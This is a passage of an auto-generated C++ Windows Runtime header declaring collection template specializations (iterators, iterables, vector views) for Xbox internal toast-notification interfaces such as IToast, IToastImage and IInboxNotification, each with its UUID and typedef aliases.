        return L"Windows.Foundation.Collections.IIterator`1<Windows.Xbox.UI.Internal.ToastNotifications.IToastImage>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*> __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_t;
#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage Windows::Foundation::Collections::__FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*>
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_t Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_USE
#define DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("cabcbc51-6fbe-58fb-809d-dad14a46e856"))
IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*> : IIterable_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterable`1<Windows.Xbox.UI.Internal.ToastNotifications.IToastImage>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*> __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_t;
#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage Windows::Foundation::Collections::__FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*>
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_t Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_USE
#define DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("1b901de3-9ea5-5e15-9045-66834e74d9ce"))
IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*> : IIterator_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterator`1<Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*> __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_t;
#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow Windows::Foundation::Collections::__FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*>
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_t Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_USE
#define DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("b38c9825-6e55-5069-aae4-fc038154d095"))
IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*> : IIterable_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterable`1<Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*> __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_t;
#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow Windows::Foundation::Collections::__FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*>
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_t Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_USE
#define DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("32918ce1-32a6-53ab-8eaa-944bcb2398f2"))
IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*> : IIterator_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterator`1<Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreGroup>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*> __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_t;
#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup Windows::Foundation::Collections::__FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*>
//#define __FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_t Windows::Foundation::Collections::IIterator<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterator_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_USE
#define DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("24b3a513-82fe-56ae-955e-3a8bfc314101"))
IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*> : IIterable_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IIterable`1<Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreGroup>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*> __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_t;
#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup Windows::Foundation::Collections::__FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*>
//#define __FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_t Windows::Foundation::Collections::IIterable<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIIterable_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_USE
#define DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("27dc7a8b-6c69-5a59-ac2e-28dbbc2b2341"))
IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*> : IVectorView_impl<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IVectorView`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxAction>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*> __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_t;
#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction Windows::Foundation::Collections::__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*>
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_t Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxAction_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#define DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("fd9da9b1-e132-5c5a-858a-78dadb60b109"))
IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> : IVectorView_impl<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IVectorView`1<Windows.Xbox.UI.Internal.ToastNotifications.IInboxNotification>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*> __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t;
#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::Collections::__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_t Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IInboxNotification*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_USE
#define DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("918e3fa6-dbcd-5056-a78f-a9b6c19f16ff"))
IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*> : IVectorView_impl<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IVectorView`1<Windows.Xbox.UI.Internal.ToastNotifications.IPickerOption>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*> __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_t;
#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption Windows::Foundation::Collections::__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*>
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_t Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IPickerOption*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIPickerOption_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE
#define DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("9f187e2f-d720-5835-a639-8979973a0351"))
IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> : IVectorView_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IVectorView`1<Windows.Xbox.UI.Internal.ToastNotifications.IToast>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t;
#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast Windows::Foundation::Collections::__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToast*>
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToast*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_USE
#define DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("3572adde-f214-5a45-95d2-62515a67cf0a"))
IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*> : IVectorView_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IVectorView`1<Windows.Xbox.UI.Internal.ToastNotifications.IToastImage>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*> __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_t;
#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage Windows::Foundation::Collections::__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*>
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_t Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastImage*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastImage_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_USE
#define DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("55e3fbaf-df6e-5c9a-9a6c-758a69ac9ed9"))
IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*> : IVectorView_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IVectorView`1<Windows.Xbox.UI.Internal.ToastNotifications.IToastQuickRow>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*> __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_t;
#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow Windows::Foundation::Collections::__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*>
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_t Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastQuickRow*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastQuickRow_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_USE
#define DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("2f8d86bb-442c-5dd5-b9bf-49bc5b416ad0"))
IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*> : IVectorView_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IVectorView`1<Windows.Xbox.UI.Internal.ToastNotifications.IToastStoreGroup>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*> __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_t;
#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup Windows::Foundation::Collections::__FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*>
//#define __FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_t Windows::Foundation::Collections::IVectorView<Windows::Xbox::UI::Internal::ToastNotifications::IToastStoreGroup*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToastStoreGroup_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIVector_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE
#define DEF___FIVector_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation { namespace Collections {
template <>
struct __declspec(uuid("4b002eac-7f94-5ac2-8744-1a1e03b364e8"))
IVector<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> : IVector_impl<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> 
{
    static const wchar_t* z_get_rc_name_impl() 
    {
        return L"Windows.Foundation.Collections.IVector`1<Windows.Xbox.UI.Internal.ToastNotifications.IToast>"; 
    }
};
// Define a typedef for the parameterized interface specialization's mangled name.
// This allows code which uses the mangled name for the parameterized interface to access the
// correct parameterized interface specialization.
typedef IVector<Windows::Xbox::UI::Internal::ToastNotifications::IToast*> __FIVector_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t;
#define __FIVector_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast Windows::Foundation::Collections::__FIVector_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t
/* Collections */ } /* Foundation */ } /* Windows */ } 

////  Define an alias for the C version of the interface for compatibility purposes.
//#define __FIVector_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast Windows::Foundation::Collections::IVector<Windows::Xbox::UI::Internal::ToastNotifications::IToast*>
//#define __FIVector_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_t Windows::Foundation::Collections::IVector<Windows::Xbox::UI::Internal::ToastNotifications::IToast*>
#endif // !defined(RO_NO_TEMPLATE_NAME)
#endif /* DEF___FIVector_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIToast_USE */


#endif // WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000


#if WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION >= 0x10000

#ifndef DEF___FIAsyncOperationCompletedHandler_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#define DEF___FIAsyncOperationCompletedHandler_1___FIVectorView_1_Windows__CXbox__CUI__CInternal__CToastNotifications__CIInboxNotification_USE
#if !defined(RO_NO_TEMPLATE_NAME)
namespace Windows { namespace Foundation {
template <>
struct __declspec(uuid("e569baa7-5175-5d6e-a9a5-10cfeee09cb9"))
